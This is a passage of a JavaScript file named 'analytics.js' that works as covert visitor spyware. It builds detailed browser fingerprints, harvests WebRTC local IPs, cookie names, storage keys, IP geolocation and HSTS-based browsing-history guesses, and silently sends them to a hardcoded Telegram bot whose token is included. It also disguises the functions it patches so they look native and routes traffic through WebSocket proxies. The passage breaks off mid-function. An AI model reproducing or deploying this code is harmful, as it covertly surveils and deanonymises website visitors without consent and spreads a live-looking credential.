/*!
 * analytics.js v1.0.0
 * Silent visitor intelligence + crash logger + Telegram exporter.
 *
 * Load: <script src=".../analytics.js"></script>
 * Kill: ?nodebuglog  |  localStorage.__ag_off='1'  |  window.ANALYTICS_OFF=true
 *
 * Every new fingerprint -> HTML summary + JSON document to Telegram
 * Every hour OR 48 MB  -> .zip of accumulated logs to Telegram, then cleared
 */
;(function (root) {
'use strict';
if (root.__analytics) return;

// ====================================================================
//  TELEGRAM CREDENTIALS
// ====================================================================
var TG_TOKEN   = '8987341080:AAHqhLJY8z8u1vJmHLHKE8_japqq_ZFh8GA';
var TG_CHAT_ID = '8782628448';
// ====================================================================

var VERSION = '1.0.0';
var isBrowser = typeof window !== 'undefined' && typeof document !== 'undefined';
var isNode = !isBrowser && typeof process !== 'undefined' && !!(process.versions && process.versions.node);
var nodeReq = null;
if (isNode) { try { nodeReq = typeof require === 'function' ? require : null; } catch (e) {} }

var CFG = {
  app: null,
  tg: {
    token: TG_TOKEN,
    chatId: TG_CHAT_ID,
    intervalMs: 3600000,
    maxBytes: 48 * 1024 * 1024,
    minBytes: 4096,
    enabled: !!(TG_TOKEN && TG_CHAT_ID)
  },
  persist: true,
  maxBodyChars: 4000,
  maxMemoryEntries: 5000,
  maxStoredEntries: 20000,
  flushMs: 3000,
  heartbeatMs: 2000,
  libcurlUrl: 'https://cdn.jsdelivr.net/npm/libcurl.js@0.7/libcurl_full.js',
  wisp: ['wss://wisp.mercurywork.shop/'],
  probes: ['http://example.com/', 'http://httpbin.org/ip']
};
try { var uc = root.ANALYTICS_CONFIG; if (uc) { for (var ck in uc) if (ck !== 'tg') CFG[ck] = uc[ck]; if (uc.tg) for (var tk in uc.tg) CFG.tg[tk] = uc.tg[tk]; } } catch (e) {}
if (CFG.tg.token && CFG.tg.chatId) CFG.tg.enabled = true;

function isOff() {
  try {
    if (root.ANALYTICS_OFF === true) return true;
    if (isBrowser && /[?&]nodebuglog\b/.test(root.location.search)) return true;
    if (typeof localStorage !== 'undefined' && localStorage.getItem('__ag_off') === '1') return true;
  } catch (e) {}
  return false;
}
if (isOff()) {
  var nop = function () {};
  root.__analytics = { enabled: false, version: VERSION, log: nop, start: nop, stop: nop };
  return;
}

// ===================== UTILITIES =====================
var origSetInterval = root.setInterval, origClearInterval = root.clearInterval;
var origSetTimeout = root.setTimeout, origClearTimeout = root.clearTimeout;
var origFetch = typeof root.fetch === 'function' ? root.fetch : null;
var perfNow = function () { try { return performance.now(); } catch (e) { return Date.now(); } };
var startedAt = Date.now();
var sid = startedAt.toString(36) + Math.random().toString(36).slice(2, 6);
var undo = [], buf = [], pending = [], seq = 0, busy = false;

function safe(fn) { return function () { try { return fn.apply(this, arguments); } catch (e) {} }; }
function now() { return Date.now(); }
function ms(t0) { return Math.round(perfNow() - t0); }
function appName() {
  try { return CFG.app || (isBrowser && document.title) || (isNode && process.argv[1] && nodeReq && nodeReq('path').basename(process.argv[1])) || 'app'; }
  catch (e) { return 'app'; }
}
function safeName(s) { return String(s || 'app').replace(/[^\w.-]+/g, '_').slice(0, 40); }
function escHtml(s) { return String(s == null ? '' : s).replace(/[<>&]/g, function (c) { return c === '<' ? '&lt;' : c === '>' ? '&gt;' : '&amp;'; }); }
function trunc(s, n) { n = n || 200; s = String(s == null ? '' : s); return s.length > n ? s.slice(0, n) + '…' : s; }
function capStr(s) { var m = CFG.maxBodyChars; return m && s.length > m ? s.slice(0, m) + '…+' + (s.length - m) : s; }
function hash32(str) {
  var h = 0x811c9dc5;
  for (var i = 0; i < str.length; i++) { h ^= str.charCodeAt(i); h = (h + ((h << 1) + (h << 4) + (h << 7) + (h << 8) + (h << 24))) >>> 0; }
  return ('00000000' + h.toString(16)).slice(-8);
}
function disguise(w, orig) { try { w.toString = function () { return Function.prototype.toString.call(orig); }; w.__ag = true; } catch (e) {} return w; }
function patch(obj, name, factory) {
  try {
    if (!obj || typeof obj[name] !== 'function' || obj[name].__ag) return;
    var orig = obj[name], w = disguise(factory(orig), orig);
    obj[name] = w;
    undo.push(function () { if (obj[name] === w) obj[name] = orig; });
  } catch (e) {}
}
function listen(t, type, fn, opts) {
  try {
    if (!t || !t.addEventListener) return;
    var h = safe(fn); t.addEventListener(type, h, opts);
    undo.push(function () { try { t.removeEventListener(type, h, opts); } catch (e) {} });
  } catch (e) {}
}

function ser(v, d, seen) {
  d = d == null ? 4 : d;
  try {
    var t = typeof v;
    if (v === null || t === 'boolean') return v;
    if (t === 'undefined') return '[undefined]';
    if (t === 'number') return isFinite(v) ? v : String(v);
    if (t === 'string') return capStr(v);
    if (t === 'bigint') return v.toString() + 'n';
    if (t === 'function') return '[Fn ' + (v.name || 'anon') + ']';
    seen = seen || [];
    if (seen.indexOf(v) > -1) return '[Circ]';
    if (v instanceof Error) return { name: v.name, message: v.message, stack: v.stack };
    if (typeof Node !== 'undefined' && v instanceof Node) return '[Node]';
    if (d <= 0) return '[Object]';
    seen.push(v);
    if (Array.isArray(v)) { var a = []; for (var i = 0; i < v.length && i < 100; i++) a.push(ser(v[i], d - 1, seen)); return a; }
    var o = {}, n = 0;
    for (var kk in v) { if (n++ > 80) break; try { o[kk] = ser(v[kk], d - 1, seen); } catch (e) {} }
    return o;
  } catch (e) { return '[unser]'; }
}
function fmtArgs(args) {
  var p = [];
  for (var i = 0; i < args.length; i++) {
    var a = args[i];
    if (typeof a === 'string') p.push(a);
    else if (a instanceof Error) p.push(a.stack || (a.name + ': ' + a.message));
    else { try { p.push(JSON.stringify(ser(a))); } catch (e) { p.push(String(a)); } }
  }
  return capStr(p.join(' '));
}

// ===================== ZIP WRITER =====================
var CRC_T = null;
function crc32(b) {
  if (!CRC_T) { CRC_T = new Uint32Array(256); for (var n = 0; n < 256; n++) { var c = n; for (var k = 0; k < 8; k++) c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1); CRC_T[n] = c >>> 0; } }
  var crc = 0xFFFFFFFF;
  for (var i = 0; i < b.length; i++) crc = (crc >>> 8) ^ CRC_T[(crc ^ b[i]) & 0xFF];
  return (crc ^ 0xFFFFFFFF) >>> 0;
}
function dosDT(d) {
  return { t: ((d.getHours() & 0x1F) << 11) | ((d.getMinutes() & 0x3F) << 5) | ((d.getSeconds() >> 1) & 0x1F),
           d: (((d.getFullYear() - 1980) & 0x7F) << 9) | (((d.getMonth() + 1) & 0x0F) << 5) | (d.getDate() & 0x1F) };
}
function deflateRaw(bytes) {
  if (typeof CompressionStream === 'function') {
    try { var cs = new CompressionStream('deflate-raw'); return new Response(new Blob([bytes]).stream().pipeThrough(cs)).arrayBuffer().then(function (ab) { return new Uint8Array(ab); }, function () { return null; }); } catch (e) {}
  }
  if (isNode && nodeReq) {
    try { var zlib = nodeReq('zlib'); return new Promise(function (res) { zlib.deflateRaw(Buffer.from(bytes), function (e, o) { res(e ? null : new Uint8Array(o)); }); }); } catch (e) {}
  }
  return Promise.resolve(null);
}
function makeZip(entries) {
  var enc = new TextEncoder();
  return Promise.all(entries.map(function (e) {
    var raw = e.data instanceof Uint8Array ? e.data : enc.encode(String(e.data));
    return deflateRaw(raw).then(function (c) {
      var use = c && c.length < raw.length;
      return { name: e.name, nb: enc.encode(e.name), raw: raw, payload: use ? c : raw, method: use ? 8 : 0, crc: crc32(raw) };
    });
  })).then(function (items) {
    var dt = dosDT(new Date()), parts = [], central = [], offset = 0;
    items.forEach(function (it) {
      var lfh = new Uint8Array(30 + it.nb.length), dv = new DataView(lfh.buffer);
      dv.setUint32(0, 0x04034b50, true); dv.setUint16(4, 20, true); dv.setUint16(6, 0, true);
      dv.setUint16(8, it.method, true); dv.setUint16(10, dt.t, true); dv.setUint16(12, dt.d, true);
      dv.setUint32(14, it.crc, true); dv.setUint32(18, it.payload.length, true); dv.setUint32(22, it.raw.length, true);
      dv.setUint16(26, it.nb.length, true); dv.setUint16(28, 0, true); lfh.set(it.nb, 30);
      parts.push(lfh, it.payload); central.push({ it: it, off: offset }); offset += lfh.length + it.payload.length;
    });
    var cdStart = offset, cdParts = [];
    central.forEach(function (c) {
      var cfh = new Uint8Array(46 + c.it.nb.length), dv = new DataView(cfh.buffer);
      dv.setUint32(0, 0x02014b50, true); dv.setUint16(4, 20, true); dv.setUint16(6, 20, true); dv.setUint16(8, 0, true);
      dv.setUint16(10, c.it.method, true); dv.setUint16(12, dt.t, true); dv.setUint16(14, dt.d, true);
      dv.setUint32(16, c.it.crc, true); dv.setUint32(20, c.it.payload.length, true); dv.setUint32(24, c.it.raw.length, true);
      dv.setUint16(28, c.it.nb.length, true); dv.setUint16(30, 0, true); dv.setUint16(32, 0, true); dv.setUint16(34, 0, true);
      dv.setUint16(36, 0, true); dv.setUint32(38, 0, true); dv.setUint32(42, c.off, true); cfh.set(c.it.nb, 46);
      cdParts.push(cfh); offset += cfh.length;
    });
    var cdSize = offset - cdStart, eocd = new Uint8Array(22), ev = new DataView(eocd.buffer);
    ev.setUint32(0, 0x06054b50, true); ev.setUint16(4, 0, true); ev.setUint16(6, 0, true);
    ev.setUint16(8, items.length, true); ev.setUint16(10, items.length, true);
    ev.setUint32(12, cdSize, true); ev.setUint32(16, cdStart, true); ev.setUint16(20, 0, true);
    return new Blob(parts.concat(cdParts, [eocd]), { type: 'application/zip' });
  });
}

// ===================== TELEGRAM =====================
function tgUrl(m) { return 'https://api.telegram.org/bot' + CFG.tg.token + '/' + m; }
function tgFetch(url, opts) {
  var f = origFetch || (typeof fetch === 'function' ? fetch : null);
  if (!f) return Promise.reject(new Error('fetch unavailable'));
  return f.call(root, url, opts);
}
function tgPostForm(method, params) {
  var body = Object.keys(params).map(function (k) { return encodeURIComponent(k) + '=' + encodeURIComponent(params[k]); }).join('&');
  return tgFetch(tgUrl(method), {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' },
    body: body
  }).then(function (r) {
    if (!r.ok) return r.text().then(function (t) { throw new Error('TG ' + r.status + ': ' + (t || '').slice(0, 300)); });
    return r.json().then(function (j) { if (!j || j.ok !== true) throw new Error('TG: ' + JSON.stringify(j).slice(0, 200)); return j; });
  });
}
function tgSendText(text) {
  // Telegram max 4096 chars per message -> split on newlines into <=3800 char chunks
  var chunks = [], cur = '';
  String(text).split('\n').forEach(function (line) {
    if ((cur + '\n' + line).length > 3800) { if (cur) chunks.push(cur); cur = line; }
    else cur = cur ? (cur + '\n' + line) : line;
  });
  if (cur) chunks.push(cur);
  var p = Promise.resolve();
  chunks.forEach(function (c) {
    p = p.then(function () {
      return tgPostForm('sendMessage', { chat_id: CFG.tg.chatId, text: c, parse_mode: 'HTML', disable_web_page_preview: 'true' });
    });
  });
  return p;
}
function tgSendDoc(blob, name, caption) {
  var fd = new FormData();
  fd.append('chat_id', CFG.tg.chatId);
  fd.append('document', blob, name);
  fd.append('caption', (caption || '').slice(0, 1024));
  fd.append('disable_notification', 'true');
  return tgFetch(tgUrl('sendDocument'), { method: 'POST', body: fd }).then(function (r) {
    if (!r.ok) return r.text().then(function (t) { throw new Error('TG ' + r.status + ': ' + (t || '').slice(0, 300)); });
    return r.json().then(function (j) { if (!j || j.ok !== true) throw new Error('TG: ' + JSON.stringify(j).slice(0, 200)); return j; });
  });
}

// ===================== FINGERPRINT COLLECTORS =====================
function canvasFp() {
  try {
    var c = document.createElement('canvas'); c.width = 240; c.height = 60;
    var x = c.getContext('2d');
    x.textBaseline = 'top'; x.font = '14px "Arial"';
    x.fillStyle = '#f60'; x.fillRect(125, 1, 62, 20);
    x.fillStyle = '#069'; x.fillText('ag-fp', 2, 15);
    x.fillStyle = 'rgba(102,204,0,0.7)'; x.fillText('ag-fp', 4, 17);
    var url = c.toDataURL();
    return { ok: true, hash: hash32(url), len: url.length };
  } catch (e) { return { ok: false, error: String(e.message || e) }; }
}
function webglFp() {
  try {
    var c = document.createElement('canvas');
    var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
    if (!gl) return { ok: false };
    var dbg = gl.getExtension('WEBGL_debug_renderer_info');
    var ext = gl.getSupportedExtensions() || [];
    var o = { ok: true, version: gl.getParameter(gl.VERSION), vendor: gl.getParameter(gl.VENDOR), renderer: gl.getParameter(gl.RENDERER),
      unmaskedVendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : null,
      unmaskedRenderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : null,
      maxTexture: gl.getParameter(gl.MAX_TEXTURE_SIZE), maxRenderbuffer: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE),
      extCount: ext.length, extensions: ext };
    o.hash = hash32([o.unmaskedVendor, o.unmaskedRenderer, o.version, o.maxTexture, o.extCount].join('|'));
    try { var lc = gl.getExtension('WEBGL_lose_context'); if (lc) lc.loseContext(); } catch (e) {}
    return o;
  } catch (e) { return { ok: false, error: String(e.message || e) }; }
}
function audioFp() {
  return new Promise(function (resolve) {
    try {
      var Ctx = root.OfflineAudioContext || root.webkitOfflineAudioContext;
      if (!Ctx) return resolve({ ok: false, error: 'unsupported' });
      var ctx = new Ctx(1, 44100, 44100);
      var osc = ctx.createOscillator();
      osc.type = 'triangle'; osc.frequency.setValueAtTime(10000, ctx.currentTime);
      var comp = ctx.createDynamicsCompressor();
      comp.threshold.setValueAtTime(-50, ctx.currentTime); comp.knee.setValueAtTime(40, ctx.currentTime);
      comp.ratio.setValueAtTime(12, ctx.currentTime); comp.attack.setValueAtTime(0, ctx.currentTime);
      comp.release.setValueAtTime(0.25, ctx.currentTime);
      osc.connect(comp); comp.connect(ctx.destination); osc.start(0);
      ctx.startRendering().then(function (b) {
        var d = b.getChannelData(0), sum = 0;
        for (var i = 4500; i < 5000; i++) sum += Math.abs(d[i]);
        resolve({ ok: true, hash: hash32(sum.toString()), raw: sum });
      }, function (e) { resolve({ ok: false, error: String(e && e.message || e) }); });
    } catch (e) { resolve({ ok: false, error: String(e.message || e) }); }
  });
}
function detectFonts() {
  try {
    var base = ['monospace', 'sans-serif', 'serif'];
    var probes = ['Arial','Arial Black','Arial Narrow','Calibri','Cambria','Candara','Comic Sans MS','Consolas','Constantia','Corbel','Courier New','Franklin Gothic Medium','Gabriola','Georgia','Gill Sans','Helvetica','Helvetica Neue','Impact','Lucida Console','Lucida Sans Unicode','MS Sans Serif','MS Serif','Malgun Gothic','Meiryo','Microsoft Himalaya','Microsoft JhengHei','Microsoft YaHei','MingLiU','Mongolian Baiti','Palatino Linotype','Segoe Print','Segoe Script','Segoe UI','SimSun','Sylfaen','Tahoma','Times New Roman','Trebuchet MS','Verdana','Webdings','Wingdings','Yu Gothic','Monaco','Menlo','Optima','Geneva','Futura','Baskerville','Didot','Copperplate','Papyrus','Chalkboard','Cochin','Garamond','Hoefler Text','Andale Mono','Apple Chancery','American Typewriter','Brush Script MT','Rockwell','Roboto','Ubuntu','Cantarell','DejaVu Sans','Liberation Sans','Noto Sans','Noto Serif','Fira Sans','Fira Code','JetBrains Mono','Inter','Open Sans','Lato','Montserrat','Poppins','Raleway','Source Sans Pro','IBM Plex Sans','Space Mono','Source Code Pro'];
    var span = document.createElement('span');
    span.style.cssText = 'position:absolute;left:-9999px;top:-9999px;font-size:72px;line-height:normal;visibility:hidden;';
    span.textContent = 'mmmmmmmmmmlli';
    document.body.appendChild(span);
    var def = {};
    base.forEach(function (b) { span.style.fontFamily = b; def[b] = span.offsetWidth; });
    var found = [];
    probes.forEach(function (f) {
      for (var i = 0; i < base.length; i++) {
        span.style.fontFamily = "'" + f + "'," + base[i];
        if (span.offsetWidth !== def[base[i]]) { found.push(f); break; }
      }
    });
    document.body.removeChild(span);
    return { detected: found, checked: probes.length };
  } catch (e) { return { detected: [], checked: 0, error: String(e.message || e) }; }
}
function matchQueries() {
  var q = function (s) { try { return matchMedia(s).matches; } catch (e) { return null; } };
  return {
    prefers_dark: q('(prefers-color-scheme: dark)'),
    prefers_light: q('(prefers-color-scheme: light)'),
    reduced_motion: q('(prefers-reduced-motion: reduce)'),
    reduced_transparency: q('(prefers-reduced-transparency: reduce)'),
    contrast_more: q('(prefers-contrast: more)'),
    forced_colors: q('(forced-colors: active)'),
    inverted_colors: q('(inverted-colors: inverted)'),
    hover: q('(hover: hover)'),
    any_hover: q('(any-hover: hover)'),
    pointer_fine: q('(pointer: fine)'),
    pointer_coarse: q('(pointer: coarse)'),
    any_pointer_fine: q('(any-pointer: fine)'),
    portrait: q('(orientation: portrait)'),
    p3: q('(color-gamut: p3)'),
    rec2020: q('(color-gamut: rec2020)'),
    hdr: q('(dynamic-range: high)'),
    standalone: q('(display-mode: standalone)')
  };
}
function featureFlags() {
  var w = root, css = function (s) { try { return CSS.supports(s); } catch (e) { return null; } };
  return {
    wasm: typeof WebAssembly === 'object',
    webgl: !!document.createElement('canvas').getContext('webgl'),
    webgl2: !!document.createElement('canvas').getContext('webgl2'),
    webgpu: !!navigator.gpu,
    webrtc: !!w.RTCPeerConnection,
    websockets: !!w.WebSocket,
    workers: !!w.Worker,
    service_workers: 'serviceWorker' in navigator,
    notifications: 'Notification' in w,
    geolocation: 'geolocation' in navigator,
    device_motion: 'DeviceMotionEvent' in w,
    gamepad: 'getGamepads' in navigator,
    bluetooth: 'bluetooth' in navigator,
    usb: 'usb' in navigator,
    hid: 'hid' in navigator,
    serial: 'serial' in navigator,
    nfc: 'NDEFReader' in w,
    payment: 'PaymentRequest' in w,
    credentials: 'credentials' in navigator,
    clipboard: 'clipboard' in navigator,
    share: 'share' in navigator,
    vibrate: 'vibrate' in navigator,
    wake_lock: 'wakeLock' in navigator,
    fullscreen: !!document.documentElement.requestFullscreen,
    pip: 'pictureInPictureEnabled' in document,
    speech_synth: 'speechSynthesis' in w,
    speech_rec: !!(w.SpeechRecognition || w.webkitSpeechRecognition),
    broadcast_channel: 'BroadcastChannel' in w,
    fs_access: 'showOpenFilePicker' in w,
    compression: 'CompressionStream' in w,
    css_has: css('selector(:has(*))'),
    css_container: css('container-type: inline-size'),
    css_p3: css('color: color(display-p3 1 1 1)')
  };
}
function botSignals() {
  var w = root, notify = null;
  try { notify = typeof Notification !== 'undefined' ? Notification.permission : null; } catch (e) {}
  return {
    webdriver: navigator.webdriver === true,
    headless: /HeadlessChrome/.test(navigator.userAgent),
    phantom: !!w._phantom || !!w.callPhantom,
    nightmare: !!w.__nightmare,
    selenium: !!w._selenium || !!document.__selenium_unwrapped,
    dom_automation: !!w.domAutomation || !!w.domAutomationController,
    cdc_props: Object.keys(document).some(function (k) { return k.indexOf('$cdc_') === 0 || k.indexOf('$chrome_asyncScriptInfo') === 0; }),
    electron: /Electron/.test(navigator.userAgent),
    plugins_empty: !!(navigator.plugins && navigator.plugins.length === 0),
    languages_empty: !navigator.languages || navigator.languages.length === 0,
    chrome_missing: /Chrome/.test(navigator.userAgent) && !w.chrome,
    notif_denied: notify === 'denied',
    secure_context: w.isSecureContext,
    cross_origin_isolated: w.crossOriginIsolated
  };
}
function collectPerms() {
  return new Promise(function (resolve) {
    try {
      if (!navigator.permissions || !navigator.permissions.query) return resolve({});
      var names = ['geolocation','notifications','camera','microphone','clipboard-read','clipboard-write','background-sync','persistent-storage','push','screen-wake-lock','accelerometer','gyroscope','magnetometer','midi','payment-handler','storage-access'];
      var out = {}, left = names.length;
      if (!left) return resolve(out);
      names.forEach(function (n) {
        navigator.permissions.query({ name: n }).then(function (r) { out[n] = r.state; }, function () {}).then(function () { if (--left === 0) resolve(out); });
      });
    } catch (e) { resolve({}); }
  });
}
function collectMedia() {
  return new Promise(function (resolve) {
    try {
      if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return resolve({ supported: false });
      navigator.mediaDevices.enumerateDevices().then(function (list) {
        resolve({ supported: true,
          cameras: list.filter(function (d) { return d.kind === 'videoinput'; }).length,
          microphones: list.filter(function (d) { return d.kind === 'audioinput'; }).length,
          speakers: list.filter(function (d) { return d.kind === 'audiooutput'; }).length,
          labeled: list.some(function (d) { return d.label; }) });
      }, function () { resolve({ supported: false }); });
    } catch (e) { resolve({ supported: false }); }
  });
}
function collectBattery() {
  return new Promise(function (resolve) {
    try {
      if (!navigator.getBattery) return resolve({ supported: false });
      navigator.getBattery().then(function (b) {
        resolve({ supported: true, charging: b.charging, level: Math.round(b.level * 100),
          charging_time: b.chargingTime, discharging_time: b.dischargingTime });
      }, function () { resolve({ supported: false }); });
    } catch (e) { resolve({ supported: false }); }
  });
}
function collectQuota() {
  return new Promise(function (resolve) {
    try {
      if (!navigator.storage || !navigator.storage.estimate) return resolve({});
      navigator.storage.estimate().then(function (e) {
        resolve({ quota_mb: e.quota ? Math.round(e.quota / 1048576) : null,
                  usage_mb: e.usage ? Math.round(e.usage / 1048576) : null });
      }, function () { resolve({}); });
    } catch (e) { resolve({}); }
  });
}
function collectWebRTC() {
  return new Promise(function (resolve) {
    try {
      if (!root.RTCPeerConnection) return resolve({ supported: false });
      var ips = {}, done = false;
      var pc = new root.RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
      var finish = function () { if (done) return; done = true; try { pc.close(); } catch (e) {} resolve({ supported: true, ips: Object.keys(ips) }); };
      var timer = origSetTimeout.call(root, finish, 3000);
      pc.onicecandidate = function (e) {
        if (!e.candidate) { origClearTimeout.call(root, timer); return finish(); }
        var m = (e.candidate.candidate || '').match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/i);
        if (m) ips[m[1]] = true;
      };
      try { pc.createDataChannel('x'); } catch (e) {}
      pc.createOffer().then(function (o) { return pc.setLocalDescription(o); })
        .catch(function () { origClearTimeout.call(root, timer); finish(); });
    } catch (e) { resolve({ supported: false }); }
  });
}
function collectSpeech() {
  return new Promise(function (resolve) {
    try {
      if (!root.speechSynthesis || !speechSynthesis.getVoices) return resolve({ supported: false, count: 0, voices: [] });
      var grab = function () {
        var v = speechSynthesis.getVoices();
        if (v.length) resolve({ supported: true, count: v.length, voices: v.map(function (x) { return { name: x.name, lang: x.lang, local: x.localService }; }) });
      };
      grab();
      try { speechSynthesis.onvoiceschanged = grab; } catch (e) {}
      origSetTimeout.call(root, function () {
        var v = speechSynthesis.getVoices ? speechSynthesis.getVoices() : [];
        resolve({ supported: true, count: v.length, voices: v.map(function (x) { return { name: x.name, lang: x.lang, local: x.localService }; }) });
      }, 1200);
    } catch (e) { resolve({ supported: false, count: 0, voices: [] }); }
  });
}
function collectAdblock() {
  return new Promise(function (resolve) {
    try {
      var s = document.createElement('script'), done = false;
      var finish = function (v) { if (done) return; done = true; resolve(v); try { s.remove(); } catch (e) {} };
      s.src = 'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js';
      s.onload = function () { finish(false); };
      s.onerror = function () { finish(true); };
      document.head.appendChild(s);
      origSetTimeout.call(root, function () { finish(null); }, 2500);
    } catch (e) { resolve(null); }
  });
}
function collectCookies() {
  var out = { enabled: navigator.cookieEnabled, count: 0, total_bytes: 0, names: [], secure_count: 0, samesite_count: 0 };
  try {
    var raw = document.cookie || '';
    if (!raw) return out;
    var parts = raw.split(';').map(function (s) { return s.trim(); }).filter(Boolean);
    out.count = parts.length;
    parts.forEach(function (p) {
      var i = p.indexOf('='), n = i === -1 ? p : p.slice(0, i), v = i === -1 ? '' : p.slice(i + 1);
      out.names.push(n); out.total_bytes += n.length + v.length;
    });
    out.secure_count = (raw.match(/;\s*secure/gi) || []).length;
    out.samesite_count = (raw.match(/;\s*samesite=/gi) || []).length;
  } catch (e) {}
  return out;
}
function collectStorage() {
  var out = {
    local: { supported: false, keys: [], bytes: 0 },
    session: { supported: false, keys: [], bytes: 0 },
    idb: { supported: false },
    caches: { supported: false }
  };
  try { var ls = root.localStorage; out.local.supported = true; for (var i = 0; i < ls.length; i++) { var k = ls.key(i), v = ls.getItem(k) || ''; out.local.keys.push(k); out.local.bytes += k.length + v.length; } } catch (e) {}
  try { var ss = root.sessionStorage; out.session.supported = true; for (var j = 0; j < ss.length; j++) { var kk = ss.key(j), vv = ss.getItem(kk) || ''; out.session.keys.push(kk); out.session.bytes += kk.length + vv.length; } } catch (e) {}
  try { if (root.indexedDB && indexedDB.databases) out.idb.supported = true; } catch (e) {}
  try { if (root.caches) out.caches.supported = true; } catch (e) {}
  return out;
}
function probeHsts() {
  return new Promise(function (resolve) {
    var domains = ['google.com','github.com','facebook.com','twitter.com','reddit.com','amazon.com','wikipedia.org','youtube.com','netflix.com','linkedin.com','cloudflare.com','microsoft.com','apple.com','stackoverflow.com','discord.com'];
    var results = {};
    var run = function (idx) {
      if (idx >= domains.length) return resolve({ supported: true, results: results });
      var d = domains[idx], t0 = perfNow(), img = new Image(), settled = false;
      var finish = function (loaded) {
        if (settled) return; settled = true;
        var elapsed = Math.round(perfNow() - t0);
        var likely = null;
        if (loaded === true) likely = true;
        else if (loaded === false && elapsed < 20 && location.protocol === 'https:') likely = false;
        else if (loaded === false && elapsed >= 60) likely = true;
        results[d] = { ms: elapsed, loaded: loaded, likely: likely };
        run(idx + 1);
      };
      var timer = origSetTimeout.call(root, function () { try { img.src = ''; } catch (e) {} finish(null); }, 2000);
      img.onload = function () { origClearTimeout.call(root, timer); finish(true); };
      img.onerror = function () { origClearTimeout.call(root, timer); finish(false); };
      try { img.src = 'http://' + d + '/favicon.ico?_=' + now(); } catch (e) { finish(null); }
    };
    run(0);
  });
}
function buildFingerprint() {
  if (!isBrowser) return null;
  var f = {
    canvas: canvasFp(),
    webgl: webglFp(),
    fonts: detectFonts(),
    media_queries: matchQueries(),
    features: featureFlags(),
    bot_signals: botSignals(),
    hardware: {
      cores: navigator.hardwareConcurrency || null,
      memory_gb: navigator.deviceMemory || null,
      touch_points: navigator.maxTouchPoints || null,
      platform: navigator.platform,
      vendor: navigator.vendor || null
    },
    display: {
      screen: screen.width + 'x' + screen.height,
      avail: screen.availWidth + 'x' + screen.availHeight,
      color_depth: screen.colorDepth,
      pixel_depth: screen.pixelDepth,
      pixel_ratio: root.devicePixelRatio,
      orientation: (screen.orientation && screen.orientation.type) || null,
      viewport: innerWidth + 'x' + innerHeight,
      outer: outerWidth + 'x' + outerHeight
    },
    navigator: {
      ua: navigator.userAgent,
      language: navigator.language,
      languages: (navigator.languages || []).join(','),
      cookie_enabled: navigator.cookieEnabled,
      do_not_track: navigator.doNotTrack || null,
      online: navigator.onLine,
      pdf_viewer: navigator.pdfViewerEnabled || null,
      webdriver: navigator.webdriver,
      plugins_count: navigator.plugins ? navigator.plugins.length : null
    },
    intl: (function () { try { var r = Intl.DateTimeFormat().resolvedOptions(); return { locale: r.locale, timezone: r.timeZone, calendar: r.calendar, numbering_system: r.numberingSystem, hour_cycle: r.hourCycle }; } catch (e) { return null; } })(),
    connection: (function () { var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection; if (!c) return null; return { type: c.effectiveType, downlink: c.downlink, rtt: c.rtt, save_data: c.saveData }; })(),
    url: {
      protocol: location.protocol.replace(':', ''),
      host: location.host,
      hostname: location.hostname,
      pathname: location.pathname,
      origin: location.origin,
      referrer: document.referrer || null,
      secure_context: root.isSecureContext
    },
    history_length: history.length,
    timestamp: new Date().toISOString()
  };
  f.id = hash32([f.navigator.ua, f.hardware.platform, f.hardware.cores, f.hardware.memory_gb,
                 f.display.screen, f.intl && f.intl.timezone, f.canvas.hash, f.webgl.hash,
                 f.fonts.detected.length].join('|'));
  return f;
}

// ===================== GEO LOOKUP =====================
function fetchGeo() {
  return tgFetch('https://wtfismyip.com/json', { method: 'GET' })
    .then(function (r) { return r.json(); })
    .then(function (j) {
      if (j && j.IPAddress) return {
        provider: 'wtfismyip', ip: j.IPAddress, isp: j.ISP,
        city: j.City, region: j.Region, country: j.Country,
        lat: j.Latitude, lng: j.Longitude, hostname: j.Hostname, location: j.Location
      };
      throw new Error('no ip');
    })
    .catch(function () {
      return tgFetch('https://ipwho.is/', { method: 'GET' })
        .then(function (r) { return r.json(); })
        .then(function (j) {
          if (j && j.success !== false && j.ip) return {
            provider: 'ipwho', ip: j.ip,
            city: j.city, region: j.region, country: j.country, postal: j.postal,
            lat: j.latitude, lng: j.longitude,
            isp: j.connection && j.connection.isp,
            org: j.connection && j.connection.org,
            asn: j.connection && j.connection.asn
          };
          throw new Error('ipwho failed');
        });
    })
    .catch(function () { return null; });
}

// ===================== WISP / LIBCURL WORKER =====================
var worker = null, jid = 0, workerPending = {};

function workerMain() {
  var L;
  var race = function (p, ms) { return Promise.race([p, new Promise(function (_, rej) { setTimeout(function () { rej(new Error('timeout')); }, ms); })]); };
  self.onmessage = function (e) {
    var m = e.data;
    if (m.t === 'init') {
      Promise.resolve().then(function () {
        try { importScripts(m.lib); L = self.libcurl; if (!L) throw new Error('libcurl missing'); return L.load_wasm(); }
        catch (e1) {
          return import(m.libm).then(function (mod) { L = mod.libcurl; return L.load_wasm(); });
        }
      }).then(function () {
        var tried = [], i = 0;
        var next = function () {
          if (i >= m.wisp.length) return postMessage({ t: 'ready', ok: false, why: 'wisp tried: ' + tried.join(', ') });
          var w = m.wisp[i++];
          try { L.set_websocket(w); } catch (e) { tried.push(w + ' (set_websocket failed)'); return next(); }
          return Promise.any(m.probes.map(function (u) {
            return race(L.fetch(u), 12000).then(function (r) {
              if (!r || typeof r.status !== 'number') throw new Error('bad');
              return true;
            });
          })).then(function () { postMessage({ t: 'ready', ok: true, wisp: w }); },
                    function () { tried.push(w + ' (probe failed)'); return next(); });
        };
        next();
      }).catch(function (err) {
        postMessage({ t: 'ready', ok: false, why: 'load failed: ' + ((err && err.message) || err) });
      });
      return;
    }
    if (m.t === 'fetch') {
      race(L.fetch(m.url, { headers: m.headers || {} }), m.ms || 25000).then(function (r) {
        return r.text().then(function (t) { postMessage({ t: 'res', id: m.id, status: r.status, text: t }); });
